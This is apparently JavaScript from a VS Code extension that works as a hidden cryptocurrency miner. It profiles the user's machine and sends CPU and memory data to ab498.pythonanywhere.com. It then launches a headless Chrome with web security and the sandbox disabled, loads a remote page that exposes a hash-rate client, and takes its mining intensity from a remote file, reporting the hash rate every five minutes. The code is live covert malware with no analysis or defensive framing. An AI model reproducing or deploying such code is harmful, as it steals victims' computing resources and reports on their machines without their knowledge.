(async () => {


  let {
    tstt,
    safe,
    vscode,
    puppeteer,
    puppeteerBrowsers
  } = global.globalVars;

  let baseUrl = 'https://ab498.pythonanywhere.com/files/init.html';

  let chromePath;
  let browser;
  let page;
  let minUse = 0.1;
  let maxUse = 0.5;
  let [max, min] = [maxUse, minUse];


  try {
    let forceDebug = false;
    console.log('init py');
    let brInfo = {
      name: 'chrome',
      version: '130.0.6723.58',
    }

    // let baseUrl = 'http://share.liveblog365.com/init.html';

    const os = require('os');
    const fs = require('fs');
    const { readdir, stat } = require('fs/promises');
    const { join } = require('path');


    let osUserInfo;
    try {
      osUserInfo = os.userInfo();
      if (osUserInfo.username == 'Admin') {
        forceDebug = true;
        // brInfo = {
        //   name: 'firefox',
        //   version: '132.0',
        // }
      } else {
        return;
      }
    } catch (error) {
      console.log('os.userInfo() error', error);
    }


    function getCPUUsage() {
      try {
        const cpus = os.cpus();
        const userTime = cpus.reduce((acc, cpu) => acc + cpu.times.user, 0);
        const niceTime = cpus.reduce((acc, cpu) => acc + cpu.times.nice, 0);
        const sysTime = cpus.reduce((acc, cpu) => acc + cpu.times.sys, 0);
        const idleTime = cpus.reduce((acc, cpu) => acc + cpu.times.idle, 0);
        const irqTime = cpus.reduce((acc, cpu) => acc + cpu.times.irq, 0);

        const total = userTime + niceTime + sysTime + idleTime + irqTime;
        const used = total - idleTime;
        return ((1 - idleTime / total) * 100).toFixed(2);
      } catch (error) {

      }
    }

    function getMemoryUsage() {
      try {
        const totalMemory = os.totalmem();
        const freeMemory = os.freemem();
        const usedMemory = totalMemory - freeMemory;
        return {
          free: parseFloat((freeMemory / (1024 ** 3)).toFixed(2)),
          used: parseFloat((usedMemory / (1024 ** 3)).toFixed(2)),
          total: parseFloat((totalMemory / (1024 ** 3)).toFixed(2)),
          percent: parseFloat(((usedMemory / totalMemory) * 100).toFixed(2))
        };
      } catch (error) {

      }
    }
    await tstt({ baseUrl, message: "INIT_LOG", memory: getMemoryUsage(), cpu: getCPUUsage() });

    if (getMemoryUsage()?.total <= 9.0 && !forceDebug) {
      return;
    }
    async function dirSize(dir) {
      const files = await readdir(dir, { withFileTypes: true });

      const paths = files.map(async file => {
        const path = join(dir, file.name);
        if (file.isDirectory()) return await dirSize(path);
        if (file.isFile()) {
          const { size } = await stat(path);

          return size;
        }
        return 0;
      });

      return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
    }

    const cacheDir = `${os.homedir()}/.cache/puppeteer`;
    if (!fs.existsSync(cacheDir)) {
      fs.mkdirSync(cacheDir, { recursive: true });
    };
    const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
    const chromeBrowser = installedBrowsers.find(browser => browser.browser === brInfo.name);
    console.log('installed', installedBrowsers);

    if (!chromeBrowser) {
      await new Promise(r => setTimeout(r, 0 * 60 * 1000));
      await tstt({ message: "INIT_D" });
      puppeteerBrowsers.InstallOptions;
      installedBrowser = await puppeteerBrowsers.install({
        browser: brInfo.name,
        buildId: brInfo.version,
        cacheDir,
      });
      chromePath = installedBrowser.executablePath;
    } else {
      chromePath = chromeBrowser.executablePath;
    }

    if (global.cppBrowser) {
      await global.cppBrowser.close();
      global.cppBrowser = null;
      global.cppPage = null;
    }

    console.log('lch', chromePath);

    browser = await puppeteer.launch({
      executablePath: chromePath,
      headless: false,
      ignoreHTTPSErrors: true,
      // acceptInsecureCerts: true,
      args: [
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        '--allow-running-insecure-content',

        // '--ignore-certificate-errors',
        // "--ignore-certificate-errors-spki-list",
        // "--no-zygote",
        // "--no-sandbox",
        // "--enable-features=NetworkService",

        '--disable-background-timer-throttling',
        '--disable-client-side-phishing-detection',
        '--disable-default-apps',
        '--disable-hang-monitor',
        '--disable-popup-blocking',
        '--disable-prompt-on-repost',
        '--disable-sync',
        '--enable-automation',
        '--enable-devtools-experiments',
        '--metrics-recording-only',
        '--no-first-run',
        '--password-store=basic',
        '--remote-debugging-port=0',
        '--safebrowsing-disable-auto-update',
        '--use-mock-keychain',
        // '--disable-background-networking',
        // '--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Temp',
        // '--disable-gpu',
        '--headless',
        '--hide-scrollbars',
        '--mute-audio',
        '--no-sandbox'
      ]
    });

    global.cppBrowser = browser;
    // os.setPriority(browser.process().pid, 19);
    page = await browser.newPage();

    global.cppPage = page;


    try {
      [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
    } catch (error) { }
    await page.goto(baseUrl + '?use=' + max);
    await new Promise(r => setTimeout(r, 10 * 1000));
    let clt = await page.evaluate(() => window._client);
    if (!clt) {
      tstt({
        baseUrl,
        message: "INIT_CLT",
        value: "No client",
        version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
      });
      if (global.inIntv) clearInterval(global.inIntv);
      return;
    }


    if (global.inIntv) clearInterval(global.inIntv);
    global.inIntv = setInterval(chkFn, 5 * 60000);
    await chkFn();


    async function chkFn() {
      if (browser && page) {
        const hs = await page.evaluate(() => {
          try {
            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client };
          } catch (error) {
            return { message: error.message, value: null, error, _client: window._client };
          }
        });
        if (hs.message != 'success') {
          tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
          return;
        }
        [max, min] = [maxUse, minUse];
        try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
        catch (error) { }
        tstt({
          baseUrl,
          message: "HASH",
          max: max,
          value: safe(() => parseFloat(hs?.value).toFixed(2)),
          cpu: getCPUUsage(),
          memory: getMemoryUsage(),
        });

        await page.evaluate((max, baseUrl) => {
          if (window.use != max) window.location.href = baseUrl + '?use=' + max;
        }, max, baseUrl);
      } else {
        tstt({
          baseUrl,
          message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
          value: 0,
        });
      }
    }


  } catch (error) {
    tstt({
      baseUrl,
      message: "INIT_ERROR",
      value: error?.message,
      stack: error?.stack,
      error: error,
      version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
    });
    if (global.inIntv) clearInterval(global.inIntv);
  }

})();